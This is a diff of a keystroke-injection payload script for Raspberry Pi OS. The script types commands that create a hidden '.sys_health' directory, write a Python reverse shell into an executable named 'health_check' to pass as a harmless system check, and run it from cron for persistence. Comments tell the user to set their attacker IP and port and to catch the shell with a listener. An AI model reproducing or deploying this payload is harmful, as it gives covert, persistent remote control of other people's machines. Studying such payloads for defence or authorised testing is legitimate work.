@@ -3,6 +3,7 @@ REM Author: fierceoj
 REM Description: Python reverse shell, placed into a hidden shell script and called from cron
 REM Target: Raspberry Pi OS
 REM Usage: Change attacker IP/URL and port to yours
+REM Usage: Change cron job to desired interval
 REM Usage: Catch the shell with a listener
 REM =========================================================================================
 DELAY 3000
@@ -14,12 +15,10 @@ REM Make the hidden directory
 STRING mkdir .sys_health
 DELAY 200
 ENTER
-STRING cd .sys_health
-DELAY 200
-ENTER
 
-REM Add Python reverse shell code to shell script in hidden directory
-STRING nano health_check
+REM Add Python reverse shell to shell script in hidden directory
+REM Reference: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+STRING nano .sys_health/health_check
 DELAY 200
 ENTER 
 STRING python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
@@ -35,7 +34,7 @@ DELAY 200
 ENTER
 
 REM Make script executable
-STRING chmod +x health_check
+STRING chmod +x .sys_health/health_check
 DELAY 200
 ENTER
 
